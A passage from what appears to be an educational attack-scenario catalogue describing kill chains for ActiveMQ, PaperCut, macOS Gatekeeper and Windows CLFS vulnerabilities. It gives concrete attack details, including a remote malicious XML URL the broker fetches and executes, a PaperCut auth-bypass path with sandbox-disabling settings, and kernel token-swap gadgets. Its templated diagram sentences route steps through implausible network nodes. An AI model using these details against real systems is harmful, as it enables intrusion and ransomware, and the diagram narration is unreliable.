- **Canonical URL**: https://attackexplorer.org/scenarios/apache-activemq-cve-2023-46604-openwire
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=apache-activemq-cve-2023-46604-openwire
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: Rapid7 · Huntress · CVE-2023-46604 · TCP/61616 OpenWire Command 31 & ClassPathXmlApplicationContext
- **Overview**: Imagine a message-sorting warehouse (Apache ActiveMQ) where delivery trucks communicate over TCP port 61616 using a binary walkie-talkie protocol called OpenWire. Whenever a truck encounters an error, it sends an "Exception Report" (Command Type 31: ExceptionResponse) listing the Java error class name and a message string so the warehouse computer can recreate the error object in memory (Class.forName(className).getConstructor(String.class).newInstance(message)). However, the warehouse computer forgets to check whether the named class is actually an Error class! The attacker sends an Exception Report naming Spring’s ClassPathXmlApplicationContext as the "error class" and a URL to a malicious poc.xml file as the "error message", causing the warehouse computer to download the XML blueprint and immediately run the attacker’s shell commands! Synthesizing Rapid7, Huntress Labs, Trend Micro, and CISA KEV (October–November 2023), CVE-2023-46604 (CVSS 10.0) is an unauthenticated Remote Code Execution vulnerability in Apache ActiveMQ’s OpenWire protocol marshaller on TCP port 61616. By sending a crafted ExceptionResponse frame (data structure type 31 / 0x1F), an attacker forces BaseDataStreamMarshaller.createThrowable() to instantiate org.springframework.context.support.ClassPathXmlApplicationContext with an attacker-controlled HTTP URL, causing the ActiveMQ JVM to fetch a remote Spring XML configuration and execute OS commands via java.lang.ProcessBuilder.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (ActiveMQ OpenWire CVE-2023-46604) - Initial Access), T1203 (Exploitation for Client/Server Execution (Spring ClassPathXmlApplicationContext) - Execution), T1059.004 (Command and Scripting Interpreter (Spring ProcessBuilder init-method="start") - Execution)
- **Primary Analytical Sources**: Rapid7 Emergent Threat Response: Suspected Ransomware Activity Targeting Apache ActiveMQ (CVE-2023-46604) (https://www.rapid7.com/blog/post/2023/11/01/etr-suspected-ransomware-activity-targeting-apache-activemq-cve-2023-46604/) | Huntress Security Research: Active Exploitation of Apache ActiveMQ CVE-2023-46604 in the Wild (https://www.huntress.com/blog/active-exploitation-of-apache-activemq-cve-2023-46604) | Apache Software Foundation & Trend Micro: Apache ActiveMQ OpenWire Unauthenticated RCE Advisory (CVE-2023-46604) (https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application (CVE-2023-46604)): **OpenWire ExceptionResponse (0x1F) Arbitrary Class Instantiation** — The attacker connects to ActiveMQ’s binary OpenWire port (61616) and sends a 78-byte "Exception Report" packet, except instead of naming a Java Exception, the packet names ClassPathXmlApplicationContext and a remote HTTP URL. The attacker connects to the Apache ActiveMQ broker on TCP port 61616 (the binary OpenWire messaging port exposed by default) and sends a crafted Command Type 31 (0x1F ExceptionResponse) frame. Instead of a real Java exception class, the packet specifies org.springframework.context.support.ClassPathXmlApplicationContext as the class name and http://185.220.101.44:8080/poc.xml as the exception message (abusing the fact that ExceptionResponseMarshaller unmarshals both strings directly from the wire without authenticating the client). In the OpenWire binary protocol, byte offset 4 specifies the command data structure type: 0x1F (31) routes the packet directly to ExceptionResponseMarshaller.tightUnmarshal(), which calls tightUnmarshalThrowable(). In the documented TCP/61616 OpenWire 0x1F exchange from OpenWire Exploit & XML Server to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with ALERT 78 Bytes (0x1F) (confirming that the OPENWIRE EXCEPTION FRAME request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 createThrowable() Reflection & Remote Spring XML Fetch). On the diagram, follow Step #1 / Link #1 (#1→ OPENWIRE EXCEPTION FRAME / ⇠#1 ALERT 78 Bytes (0x1F)) from Node ① (#1 OpenWire Exploit & XML Server) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Huntress EDR & Suricata IDS). [Specs: PROTOCOL & PORT=Apache ActiveMQ OpenWire (TCP/61616); COMMAND TYPE=31 (0x1F — ExceptionResponse); INJECTED CLASS=org.springframework.context.support.ClassPathXmlApplicationContext]
  - Stage 2 (T1203 · Exploitation for Client/Server Execution (Spring IoC XML)): **createThrowable() Reflection & Remote Spring XML Fetch** — Because createThrowable() never checks if the requested class actually inherits from java.lang.Throwable, it calls the ClassPathXmlApplicationContext(String) constructor, which immediately reaches out over HTTP to download poc.xml. Inside the ActiveMQ broker, BaseDataStreamMarshaller.createThrowable() looks up the attacker-supplied class name and invokes its single-String constructor via Java reflection (because prior to 5.18.3, createThrowable() never verified whether the target class actually implemented java.lang.Throwable before calling Constructor.newInstance(message)). Instantiating ClassPathXmlApplicationContext with an HTTP URL forces the ActiveMQ JVM to make an outbound HTTP GET request to the attacker server and parse poc.xml as a trusted Spring IoC bean definition file. Because Apache ActiveMQ bundles spring-context in its default lib/ directory, org.springframework.context.support.ClassPathXmlApplicationContext is always present on the broker’s classpath and accepts an arbitrary http:// or https:// XML URL in its single-String constructor. In the documented data/activemq.log exchange from DMZ Reverse Proxy & SPAN Tap to ActiveMQ OpenWire (:61616), ActiveMQ OpenWire (:61616) responds with RESP HTTP 200 (poc.xml) (confirming that the SPRING XML URL FETCH request succeeded on ActiveMQ OpenWire (:61616) and establishing the runtime state required for Step #3 Spring ProcessBuilder init-method="start" RCE). On the diagram, follow Step #2 / Link #2 (#2→ SPRING XML URL FETCH / ⇠#2 RESP HTTP 200 (poc.xml)) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 ActiveMQ OpenWire (:61616)), monitored by Node ⑥ (#6 Huntress EDR & Suricata IDS). [Specs: VULNERABLE METHOD=BaseDataStreamMarshaller.createThrowable(String, String); REMOTE XML URL=http://185.220.101.44:8080/poc.xml; LOG ARTIFACT=Loading XML bean definitions from URL [http://.../poc.xml]]
  - Stage 3 (T1059.004 · Command and Scripting Interpreter: Unix Shell / Windows Cmd): **Spring ProcessBuilder init-method="start" RCE** — As Spring builds the objects listed inside poc.xml, it constructs a ProcessBuilder object and automatically runs its start() method, launching the attacker’s shell or ransomware installer inside the ActiveMQ service account. As Spring initializes the beans defined in poc.xml, it constructs a bean of class java.lang.ProcessBuilder with constructor arguments ["/bin/sh", "-c", "..."] and triggers init-method="start" (a standard Spring XML lifecycle attribute that automatically invokes ProcessBuilder.start() the moment the bean is created in memory). This spawns a child shell or msiexec.exe directly under the ActiveMQ broker service account (used in the wild to deploy HelloKitty, LockBit, and Kinsing payloads). Apache patched CVE-2023-46604 in ActiveMQ 5.18.3 by adding a strict type check inside BaseDataStreamMarshaller.createThrowable(): if (!Throwable.class.isAssignableFrom(clazz)) throw new IOException(...). On the diagram, follow Step #3 / Link #3 (#3→ PROCESSBUILDER.START() / ⇠#3 ACK PID 3814) from Node ③ (#3 ActiveMQ OpenWire (:61616)) to Node ④ (#4 ActiveMQ JVM (createThrowable)), monitored by Node ⑥ (#6 Huntress EDR & Suricata IDS). [Specs: SPRING BEAN GADGET=<bean class="java.lang.ProcessBuilder" init-method="start">; PROCESS TREE=java (PID 3190) -> /bin/sh -c (PID 3814); PATCHED VERSIONS=ActiveMQ 5.15.16, 5.16.7, 5.17.6, 5.18.3 (Throwable check)]

### CVE-2023-27350: Horizon3.ai, CISA & Microsoft — PaperCut MF/NG SetupCompleted Auth Bypass & Rhino JS SYSTEM RCE
- **Scenario ID**: `papercut-ng-cve-2023-27350-bl00dy`
- **Canonical URL**: https://attackexplorer.org/scenarios/papercut-ng-cve-2023-27350-bl00dy
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=papercut-ng-cve-2023-27350-bl00dy
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: CISA AA23-131A · Horizon3.ai · Bl00dy & Cl0p · /app?service=page/SetupCompleted & pc-app.exe
- **Overview**: Imagine a corporate print-management building (PaperCut MF/NG) where the "Welcome / Setup Completed" reception page (/app?service=page/SetupCompleted) was left unlocked years after the building opened. Even worse, clicking the "Login" button on that welcome page doesn’t ask for a password, it tells the security desk to automatically sign the visitor in as the master admin (performLogin("admin"))! Once handed the master admin cookie, the attacker walks into the printer scripting room, turns off the JavaScript safety cage (print.script.sandboxed=N), and writes a one-line printer script (java.lang.Runtime.getRuntime().exec(...)) that runs as NT AUTHORITY\SYSTEM the instant they click Save. Synthesizing Horizon3.ai’s root-cause analysis, Joint CISA/FBI Advisory AA23-131A, and Microsoft Threat Intelligence (April–May 2023), CVE-2023-27350 (CVSS 9.8) is an unauthenticated session-hijacking and Remote Code Execution flaw in PaperCut MF and NG exploited by the Bl00dy Ransomware Gang, Cl0p, and LockBit. An unauthenticated attacker visits /app?service=page/SetupCompleted and submits the Login form listener to mint an authenticated admin JSESSIONID cookie, disables the Rhino JavaScript sandbox (print.script.sandboxed=N) in ConfigEditor, and injects java.lang.Runtime.getRuntime().exec() into a Printer Script running inside pc-app.exe as NT AUTHORITY\SYSTEM.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (PaperCut SetupCompleted CVE-2023-27350) - Initial Access), T1059.007 (Command and Scripting Interpreter: JavaScript (Mozilla Rhino Sandbox Bypass) - Execution), T1059.001 (Command and Scripting Interpreter: PowerShell (pc-app.exe SYSTEM Child) - Execution)
- **Primary Analytical Sources**: CISA & FBI Joint Advisory: AA23-131A: Malicious Actors Exploit CVE-2023-27350 in PaperCut MF and NG (https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-131a) | Horizon3.ai Attack Team: PaperCut CVE-2023-27350 Deep Dive and Indicators of Compromise (https://www.horizon3.ai/attack-research/attack-blogs/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/) | PaperCut Software & Microsoft Threat Intelligence: PaperCut MF/NG Security Bulletin (March/April 2023) — CVE-2023-27350 & CVE-2023-27351 (https://www.papercut.com/kb/Main/PO-1216-and-PO-1219)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application (CVE-2023-27350)): **Tapestry SetupCompleted Authentication Bypass (performLogin)** — By visiting the leftover SetupCompleted onboarding page and submitting its form button, the attacker tricks PaperCut into calling performLogin("admin") without asking for a password. The attacker sends an HTTP GET request to /app?service=page/SetupCompleted followed by a POST request invoking the Tapestry form listener service=direct/1/SetupCompleted/$Form (an internal onboarding page in PaperCut MF/NG that remained reachable without authentication even on fully configured production servers). Inside SetupCompleted.formSubmit(), the server calls UserWebAuth.performLogin("admin", Role.ADMIN) directly (minting a valid administrator JSESSIONID cookie for the unauthenticated caller without checking a password). Why did SetupCompleted.formSubmit() call performLogin("admin")? Because during day-one installation, after an admin finishes the setup wizard, clicking "Login" on the final confirmation screen was designed to log them straight into the dashboard automatically, and the developers forgot to block access to SetupCompleted after setup finished. In the documented HTTP POST / server.log exchange from Bl00dy / Cl0p Operator to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP HTTP 302 (Admin Cookie) (confirming that the SETUPCOMPLETED BYPASS request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 Disabling Print Script Sandbox (print.script.sandboxed=N)). On the diagram, follow Step #1 / Link #1 (#1→ SETUPCOMPLETED BYPASS / ⇠#1 RESP HTTP 302 (Admin Cookie)) from Node ① (#1 Bl00dy / Cl0p Operator) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Defender & Sysmon SIEM). [Specs: VULNERABLE PAGE=/app?service=page/SetupCompleted; TAPESTRY FORM POST=service=direct/1/SetupCompleted/$Form&$Submit$0=Login; JAVA CALL=UserWebAuth.performLogin("admin", Role.ADMIN)]
  - Stage 2 (T1059.007 · Command and Scripting Interpreter: JavaScript (Mozilla Rhino)): **Disabling Print Script Sandbox (print.script.sandboxed=N)** — Normally, PaperCut’s printer scripts run inside a safety cage (ClassShutter) so scripts can only count pages or check paper sizes. Using their hijacked Admin session, the attacker flips print.script.sandboxed to N to unlock full Java reflection. Using the hijacked Admin JSESSIONID cookie, the attacker opens /app?service=page/ConfigEditor and modifies two internal configuration keys: setting print-and-device.script.enabled=Y and print.script.sandboxed=N (which turns off the security ClassShutter inside PaperCut’s embedded Mozilla Rhino JavaScript engine so print scripts can access arbitrary Java runtime classes such as java.lang.Runtime). PaperCut embeds the Mozilla Rhino JavaScript engine (org.mozilla.javascript) so administrators can write custom JavaScript policies for print jobs. When print.script.sandboxed is set to N, Rhino scripts can bridge directly into any Java class on the JVM classpath. On the diagram, follow Step #2 / Link #2 (#2→ SANDBOX DISABLED / ⇠#2 ACK Rhino Unsandboxed) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 PaperCut Web (Tapestry :9191)), monitored by Node ⑥ (#6 Defender & Sysmon SIEM). [Specs: ENABLE SCRIPTING KEY=print-and-device.script.enabled = Y; DISABLE SANDBOX KEY=print.script.sandboxed = N; JS ENGINE=Mozilla Rhino (org.mozilla.javascript)]
  - Stage 3 (T1059.001 · Command and Scripting Interpreter: PowerShell (SYSTEM)): **Rhino JS Runtime.getRuntime().exec() as SYSTEM (pc-app.exe)** — The attacker pastes java.lang.Runtime.getRuntime().exec("powershell.exe ...") into a template printer script and clicks Apply, causing pc-app.exe to immediately evaluate the script and spawn a SYSTEM PowerShell window. The attacker navigates to /app?service=page/PrinterDetails, edits a printer script, and injects java.lang.Runtime.getRuntime().exec("powershell.exe ...") outside or inside the printJobHook() function (because PaperCut compiles and evaluates the top-level Rhino JavaScript code immediately when the administrator clicks Apply, without even waiting for a real print job to arrive). This spawns PowerShell directly beneath pc-app.exe running as NT AUTHORITY\SYSTEM. On Windows, the PaperCut Application Server service (pc-app.exe) runs by default under NT AUTHORITY\SYSTEM, meaning any command executed via Rhino’s Runtime.getRuntime().exec() immediately inherits full SYSTEM privileges. In the documented Sysmon EID 1 (ProcessCreate) exchange from PaperCut Web (Tapestry :9191) to ConfigEditor & Rhino JS Engine, ConfigEditor & Rhino JS Engine responds with ACK PID 6012 (SYSTEM) (confirming that the PC-APP.EXE SPAWNS SHELL request succeeded on ConfigEditor & Rhino JS Engine and completing the final execution objective of Horizon3.ai, CISA & Microsoft, PaperCut MF/NG SetupCompleted Auth Bypass & Rhino JS SYSTEM RCE). On the diagram, follow Step #3 / Link #3 (#3→ PC-APP.EXE SPAWNS SHELL / ⇠#3 ACK PID 6012 (SYSTEM)) from Node ③ (#3 PaperCut Web (Tapestry :9191)) to Node ④ (#4 ConfigEditor & Rhino JS Engine), monitored by Node ⑥ (#6 Defender & Sysmon SIEM). [Specs: RHINO PAYLOAD=java.lang.Runtime.getRuntime().exec("powershell.exe ..."); PARENT PROCESS=C:\Program Files\PaperCut NG\server\bin\win\pc-app.exe; PRIVILEGE LEVEL=NT AUTHORITY\SYSTEM]

### CVE-2022-42821: Microsoft Threat Intel & Jamf — macOS Gatekeeper "Achilles" Bypass via AppleDouble Restrictive ACLs
- **Scenario ID**: `macos-gatekeeper-achilles-cve-2022-42821`
- **Canonical URL**: https://attackexplorer.org/scenarios/macos-gatekeeper-achilles-cve-2022-42821
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=macos-gatekeeper-achilles-cve-2022-42821
- **Category**: MALWARE | **Severity**: HIGH
- **Subtitle**: Microsoft Research (Jonathan Bar Or) · Jamf · CVE-2022-42821 · AppleDouble ._ ACL deny writeextattr
- **Overview**: Imagine an airport customs checkpoint (macOS Gatekeeper) that only inspects suitcases that have a bright red "ARRIVED FROM OVERSEAS" sticker (com.apple.quarantine extended attribute) pasted on them by the baggage handler (Safari) the moment they come off the plane. If a suitcase has no red sticker, customs assumes it belongs to a local airport worker and waves it straight through without opening it. In the "Achilles" attack, the smuggler packs their suitcase (Update.app) inside a shipping crate (Update.zip) alongside a special macOS instruction sheet (._Update.app AppleDouble file) that coats the suitcase in Teflon (NFSv4 ACL: deny writeextattr). When Safari unpacks the crate and tries to stick the red com.apple.quarantine label onto the suitcase, the Teflon ACL makes the sticker slide right off (EACCES), so Gatekeeper waves the unsigned malware straight through with zero warnings! Discovered by Microsoft Threat Intelligence researcher Jonathan Bar Or and analyzed with Jamf Threat Labs (December 2022), CVE-2022-42821 ("Achilles") is a logic vulnerability in macOS Gatekeeper and Lockdown Mode. By packaging an unsigned .app bundle inside a ZIP archive alongside an AppleDouble metadata file (._Update.app) carrying an NFSv4 Access Control List (com.apple.acl.text) that denies writeextattr permissions to everyone, the attacker causes Safari and Archive Utility’s setxattr("com.apple.quarantine") call to fail with EACCES, leaving the extracted application completely unquarantined so syspolicyd skips Gatekeeper and Notarization checks upon launch.
- **MITRE ATT&CK Techniques**: T1553.001 (Subvert Trust Controls: Gatekeeper Bypass (CVE-2022-42821 Achilles) - Defense Evasion), T1222.002 (File and Directory Permissions Modification: Linux and Mac (AppleDouble ACL) - Defense Evasion), T1204.002 (User Execution: Malicious File (Unquarantined Mach-O) - Execution)
- **Primary Analytical Sources**: Microsoft Security Threat Intelligence (Jonathan Bar Or): Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability (CVE-2022-42821) (https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) | Jamf Threat Labs: Monitoring macOS Gatekeeper Bypasses & Unquarantined Execution with Endpoint Security (ESF) (https://www.jamf.com/blog/) | Apple Product Security: About the security content of macOS Ventura 13.1, Monterey 12.6.2, and Big Sur 11.7.2 (CVE-2022-42821) (https://support.apple.com/en-us/HT213532)
- **Kill-Chain Stages**:
  - Stage 1 (T1222.002 · File and Directory Permissions Modification: Linux and Mac (ACL)): **AppleDouble (._) Restrictive ACL Extraction (deny writeextattr)** — When macOS Archive Utility unzips Update.zip, it reads the hidden ._Update.app AppleDouble companion file and dutifully applies its deny writeextattr Access Control List onto Update.app. The attacker packages an unsigned macOS application (Update.app) inside a ZIP archive alongside an AppleDouble metadata file named ._Update.app (a special prefix format used by macOS Archive Utility / copyfile_unpack() to preserve extended attributes and Access Control Lists across ZIP archives). Inside ._Update.app, the attacker embeds a com.apple.acl.text attribute containing group:everyone deny write,writeattr,writeextattr,writesecurity,chown (an NFSv4 ACL rule that explicitly forbids every user and process on the Mac from writing new extended attributes to the extracted app). macOS uses the AppleDouble format (files prefixed with ._ and starting with magic bytes 0x00051607) to serialize macOS-specific extended attributes and ACLs inside standard ZIP archives. When ArchiveService calls copyfile_unpack(), it restores com.apple.acl.text onto the target bundle immediately. On the diagram, follow Step #1 / Link #1 (#1→ APPLEDOUBLE ACL RESTORED / ⇠#1 ACK ACL deny writeextattr) from Node ① (#1 Achilles Archive Packager) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Jamf Protect & Defender (ESF)). [Specs: APPLEDOUBLE FILE=._Update.app (Magic 0x00051607); EMBEDDED XATTR=com.apple.acl.text; RESTRICTIVE ACL=group:everyone deny write,writeattr,writeextattr,writesecurity,chown]
  - Stage 2 (T1553.001 · Subvert Trust Controls: Gatekeeper Bypass (CVE-2022-42821)): **setxattr(com.apple.quarantine) Blocked by Kernel ACL Check** — A split-second after unpacking the file, Safari tries to stamp com.apple.quarantine onto Update.app, but the macOS kernel sees the new deny writeextattr ACL and rejects Safari’s stamp with Permission denied (EACCES)! When Safari or Archive Utility finishes extracting the archive, it calls setxattr() to stamp the com.apple.quarantine extended attribute onto Update.app (the mandatory metadata flag that tells macOS a file came from the internet and must be verified by Gatekeeper). However, because the AppleDouble ACL denying writeextattr is already active on the file, the XNU kernel rejects setxattr("com.apple.quarantine") with EACCES (Permission denied) and the user-mode quarantine helper fails open without aborting the download. Because quarantine propagation in macOS Monterey and early Ventura was performed in user mode after archive extraction without stripping restrictive ACLs first, the kernel enforced the attacker’s ACL against the browser’s own setxattr() call. In the documented XNU Audit / setxattr exchange from Perimeter Firewall & NDR Tap to Safari & Archive Utility, Safari & Archive Utility responds with ACK EACCES (No Quarantine) (confirming that the QUARANTINE WRITE BLOCKED request succeeded on Safari & Archive Utility and establishing the runtime state required for Step #3 Gatekeeper & Lockdown Mode Bypass on App Launch). On the diagram, follow Step #2 / Link #2 (#2→ QUARANTINE WRITE BLOCKED / ⇠#2 ACK EACCES (No Quarantine)) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Safari & Archive Utility), monitored by Node ⑥ (#6 Jamf Protect & Defender (ESF)). [Specs: BLOCKED SYSCALL=setxattr("Update.app", "com.apple.quarantine", ...); KERNEL ERROR=errno 13 (EACCES — Permission denied by ACL); QUARANTINE XATTR=ABSENT (Failed Open)]
  - Stage 3 (T1204.002 · User Execution: Malicious File (Unquarantined Mach-O)): **Gatekeeper & Lockdown Mode Bypass on App Launch** — When the user double-clicks Update.app, Gatekeeper (syspolicyd) checks for the com.apple.quarantine attribute, sees it isn’t there, assumes the user built the app themselves, and runs the unsigned Mach-O binary immediately. When the victim double-clicks Update.app in Finder, LaunchServices invokes syspolicyd (the macOS Gatekeeper daemon) to evaluate whether the binary is allowed to run. Because Gatekeeper only enforces Apple Developer ID signatures, Notarization tickets, and Lockdown Mode binary restrictions on files that possess the com.apple.quarantine attribute (assuming any file without com.apple.quarantine was compiled or created locally by the user), syspolicyd completely skips verification and launches the unsigned Mach-O payload without a single dialog box. As Microsoft demonstrated, CVE-2022-42821 even bypassed Apple’s optional Lockdown Mode because Lockdown Mode’s binary execution policy also relied on the presence of com.apple.quarantine to identify untrusted external binaries. In the documented ES_EVENT_TYPE_NOTIFY_EXEC exchange from Safari & Archive Utility to LaunchServices & syspolicyd, LaunchServices & syspolicyd responds with ACK PID 1420 (Unsigned) (confirming that the GATEKEEPER BYPASSED request succeeded on LaunchServices & syspolicyd and completing the final execution objective of Microsoft Threat Intel & Jamf, macOS Gatekeeper "Achilles" Bypass via AppleDouble Restrictive ACLs). On the diagram, follow Step #3 / Link #3 (#3→ GATEKEEPER BYPASSED / ⇠#3 ACK PID 1420 (Unsigned)) from Node ③ (#3 Safari & Archive Utility) to Node ④ (#4 LaunchServices & syspolicyd), monitored by Node ⑥ (#6 Jamf Protect & Defender (ESF)). [Specs: EXECUTED BINARY=~/Downloads/Update.app/Contents/MacOS/Update; CODE SIGNATURE=Unsigned / Unnotarized; PATCHED OS=macOS Ventura 13.1, Monterey 12.6.2, Big Sur 11.7.2]

### CVE-2023-28252: Kaspersky GReAT & Microsoft — Windows CLFS.sys Kernel Zero-Day EoP & Nokoyawa Ransomware
- **Scenario ID**: `windows-clfs-ransomware-cve-2023-28252-nokoyawa`
- **Canonical URL**: https://attackexplorer.org/scenarios/windows-clfs-ransomware-cve-2023-28252-nokoyawa
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=windows-clfs-ransomware-cve-2023-28252-nokoyawa
- **Category**: MALWARE | **Severity**: CRITICAL
- **Subtitle**: Kaspersky Securelist · Microsoft MSRC · CVE-2023-28252 · CClfsBaseFilePersisted & ClfsEarlierLsn
- **Overview**: Imagine a high-security courthouse (Windows Kernel Ring-0) that lets any citizen on the street (Medium Integrity User) ask the court clerk (CLFS.sys, Common Log File System) to maintain a ledger book (.blf Base Log File) stored in a public locker (C:\Users\Public\log.blf). The ledger book contains page-index numbers (SignaturesOffset and rgClients) that tell the clerk where to write inside the courthouse’s own memory, protected only by a simple math checksum (CRC32). While the ledger is sitting on disk, the attacker edits the page-index numbers to point straight at a fake instruction table (Fake CClfsContainer vtable -> ClfsEarlierLsn) and recalculates the CRC32 checksum. When the clerk reads the ledger back in, it trusts the checksum, jumps to the fake instruction table, copies the Supreme Judge’s badge (PID 4 SYSTEM EPROCESS Token) onto the attacker’s coat, and lets them unleash Nokoyawa ransomware across the building! Discovered in the wild by Kaspersky GReAT and patched by Microsoft MSRC (April 2023), CVE-2023-28252 is an actively exploited Windows Common Log File System (CLFS.sys) kernel zero-day Elevation of Privilege vulnerability used to deploy Nokoyawa ransomware. A low-privileged attacker calls CreateLogFile() to create a .blf file on disk, corrupts CLFS_LOG_BLOCK_HEADER and CClfsBaseFilePersisted offsets while forging a valid CRC32 checksum, triggers an out-of-bounds kernel write in CClfsBaseFilePersisted::WriteMetadataBlock, pivots through a fake CClfsContainer vtable and ClfsEarlierLsn to overwrite the process EPROCESS Token with NT AUTHORITY\SYSTEM, and launches nokoyawa.exe.
- **MITRE ATT&CK Techniques**: T1068 (Exploitation for Privilege Escalation (Windows CLFS.sys CVE-2023-28252) - Privilege Escalation), T1134.001 (Access Token Manipulation: Token Impersonation/Theft (EPROCESS Token Swap) - Privilege Escalation), T1486 (Data Encrypted for Impact (Nokoyawa Ransomware) - Impact)
- **Primary Analytical Sources**: Kaspersky GReAT (Securelist): Nokoyawa ransomware attacks use new Windows zero-day vulnerability in CLFS (CVE-2023-28252) (https://securelist.com/nokoyawa-ransomware-attacks-use-zero-day/109483/) | Zscaler ThreatLabz: Technical Analysis of Windows CLFS Zero-Day Vulnerability CVE-2023-28252 & Nokoyawa Ransomware (https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2023-28252) | Microsoft MSRC & CISA KEV: Windows Common Log File System Driver Elevation of Privilege Vulnerability (CVE-2023-28252) (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252)
- **Kill-Chain Stages**:
  - Stage 1 (T1068 · Exploitation for Privilege Escalation (CVE-2023-28252)): **Malformed Base Log File (.blf) Creation & CRC32 Forgery** — The attacker asks Windows to create a normal .blf log file in C:\Users\Public\, then edits the raw pointer offsets inside the file on disk and recalculates the CRC32 checksum so CLFS.sys won’t realize the file was tampered with. The attacker’s low-privileged loader (clfs_eop.exe, PID 5520) calls the standard Windows API CreateLogFile("LOG:C:\Users\Public\log.blf") (which instructs the kernel driver CLFS.sys to create a Base Log File on disk) and then directly modifies the raw .blf bytes to corrupt CLFS_LOG_BLOCK_HEADER.SignaturesOffset and CLFS_BASE_RECORD_HEADER.rgClients offsets. Because CLFS.sys verifies block integrity using a standard CRC32 checksum stored in the header, the exploit recalculates and updates the CRC32 value (so the kernel driver trusts the corrupted offsets when loading the metadata block into kernel pool memory). Why is CLFS.sys such a frequent target for ransomware zero-days (CVE-2022-24521, CVE-2022-37969, CVE-2023-23376, CVE-2023-28252)? Because .blf files live in user-writable folders on disk, yet CLFS.sys parses their internal structure offsets directly into Ring-0 kernel pool memory. On the diagram, follow Step #1 / Link #1 (#1→ CRAFTED .BLF CREATED / ⇠#1 ACK 64 KB (.blf)) from Node ① (#1 clfs_eop.exe (Low-Priv User)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Kaspersky GReAT & Defender EDR). [Specs: WIN32 API=CreateLogFile(L"LOG:C:\\Users\\Public\\log.blf"); CORRUPTED OFFSETS=CLFS_LOG_BLOCK_HEADER.SignaturesOffset & rgClients; CHECKSUM BYPASS=Recalculated CRC32 in CLFS_LOG_BLOCK_HEADER.Checksum]
  - Stage 2 (T1134.001 · Access Token Manipulation: Token Impersonation/Theft (EPROCESS)): **CClfsBaseFilePersisted::WriteMetadataBlock OOB Write & ClfsEarlierLsn Gadget** — When CLFS.sys flushes the corrupted metadata block, it writes out-of-bounds and replaces a container pointer with a fake function table (ClfsEarlierLsn) that copies the SYSTEM token from PID 4 into the attacker’s process. The exploit calls AddLogContainer() and flushes the log, triggering CLFS!CClfsBaseFilePersisted::WriteMetadataBlock (which uses the corrupted in-memory block offsets to perform an out-of-bounds write that replaces a kernel pointer with the address of a fake CClfsContainer object crafted by the attacker). When CLFS.sys invokes a virtual method on that fake container, control flow jumps to kernel gadgets (CLFS!ClfsEarlierLsn and nt!SeSetAccessStateGenericMapping) that overwrite the current process’s EPROCESS Token pointer with the SYSTEM Token from PID 4. By combining nt!SeSetAccessStateGenericMapping with CLFS!ClfsEarlierLsn (which returns 0xFFFFFFFF), the exploit constructs an arbitrary kernel write primitive that overwrites the privileges/Token field of its own EPROCESS structure. On the diagram, follow Step #2 / Link #2 (#2→ EPROCESS TOKEN SWAP / ⇠#2 ALERT Token=SYSTEM (PID 4)) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 CLFS.sys (Kernel Driver)), monitored by Node ⑥ (#6 Kaspersky GReAT & Defender EDR). [Specs: VULNERABLE FUNCTION=CLFS!CClfsBaseFilePersisted::WriteMetadataBlock; KERNEL GADGETS=CLFS!ClfsEarlierLsn & nt!SeSetAccessStateGenericMapping; TOKEN OVERWRITE=EPROCESS(PID 5520).Token = EPROCESS(PID 4).Token]
  - Stage 3 (T1486 · Data Encrypted for Impact (Nokoyawa Ransomware)): **SYSTEM Privilege Escalation & Nokoyawa Ransomware Execution** — Now wearing the Supreme Judge’s SYSTEM badge, clfs_eop.exe launches the Nokoyawa ransomware binary (nokoyawa.exe), deletes Volume Shadow Copies, and encrypts the server. Now running as NT AUTHORITY\SYSTEM, clfs_eop.exe spawns nokoyawa.exe (the C++ Nokoyawa ransomware payload that uses its newly acquired SYSTEM privileges to terminate security services, wipe Volume Shadow Copies, and encrypt enterprise files with ECC secp256k1 and Salsa20). Kaspersky GReAT captured this exact chain in February 2023 across multiple Windows Server intrusions, where affiliates used CVE-2023-28252 to jump from a compromised user session directly to SYSTEM before launching Nokoyawa. In the documented Sysmon EID 1 (ProcessCreate) exchange from CLFS.sys (Kernel Driver) to ntoskrnl.exe (EPROCESS Token), ntoskrnl.exe (EPROCESS Token) responds with ACK PID 6188 (SYSTEM) (confirming that the NOKOYAWA RANSOMWARE request succeeded on ntoskrnl.exe (EPROCESS Token) and completing the final execution objective of Kaspersky GReAT & Microsoft, Windows CLFS.sys Kernel Zero-Day EoP & Nokoyawa Ransomware). On the diagram, follow Step #3 / Link #3 (#3→ NOKOYAWA RANSOMWARE / ⇠#3 ACK PID 6188 